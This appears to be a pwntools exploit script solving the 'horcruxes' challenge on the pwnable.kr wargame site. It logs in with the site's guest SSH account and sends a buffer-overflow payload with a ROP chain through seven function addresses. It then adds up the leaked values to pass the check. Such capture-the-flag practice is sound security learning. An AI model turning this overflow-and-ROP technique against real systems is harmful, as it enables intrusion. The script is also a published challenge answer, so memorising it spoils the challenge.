#!/usr/bin/python2

from pwn import *

context(arch='i386', os='linux')

offset = 120

A = p32(0x809fe4b)
B = p32(0x809fe6a)
C = p32(0x809fe89)
D = p32(0x809fea8)
E = p32(0x809fec7)
F = p32(0x809fee6)
G = p32(0x809ff05)
call_ropme = p32(0x0809fffc)

s1 = ssh(host='pwnable.kr',port=2222,user='horcruxes',password='guest')

r1 = s1.remote('localhost',9032)

print r1.recvuntil("Select Menu:")
r1.sendline("0")
print r1.recvuntil("How many EXP did you earned? :")

payload = cyclic(offset) + A + B + C + D + E + F + G + call_ropme
log.info("sending payload")
r1.sendline(payload)
lines = r1.recvuntil("Select Menu:")

exp_sum = 0

for line in lines.split("\n")[1:-1]:
	print line
	exp_sum += int(line[line.find("+")+1:-1])

r1.sendline("0")
print r1.recvuntil("How many EXP did you earned? :")
log.info("sending sum: " + str(exp_sum))
r1.sendline(str(exp_sum))
r1.interactive()

r1.close()
s1.close()
